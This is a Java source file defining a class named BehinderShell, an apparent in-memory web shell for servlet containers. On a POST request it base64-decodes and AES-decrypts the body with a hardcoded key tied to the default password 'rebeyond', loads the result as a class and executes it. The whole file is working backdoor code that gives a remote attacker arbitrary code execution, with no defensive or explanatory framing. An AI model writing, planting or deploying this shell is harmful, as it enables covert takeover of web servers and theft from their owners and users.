package com.stdout.Models;

import com.stdout.Utils.Redefine.MyReader;
import com.stdout.Utils.Redefine.MyRequest;
import com.stdout.Utils.Redefine.MyServletAttributes;
import com.stdout.Utils.Redefine.MySession;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class BehinderShell {
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte []b) {
            return super.defineClass(b,0,b.length);
        }
    }

    public static boolean isStarted = false;

    public void start(Object servlet) throws Exception {
        Object request = MyServletAttributes.getRequest(servlet);

        if (MyRequest.getMethod(request).equals("POST")) {
            /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
            String k = "e45e329feb5d925b";
            Object session = MyRequest.getSession(request);
            MySession.putValue(session, "u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            Object reader = MyRequest.getReader(request);
            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(MyReader.readline(reader)))).newInstance().equals(servlet);
        }

    }

    public static void run(Object servlet) throws Exception {
        if (!BehinderShell.isStarted) {
            new BehinderShell().start(servlet);
        }
    }
}


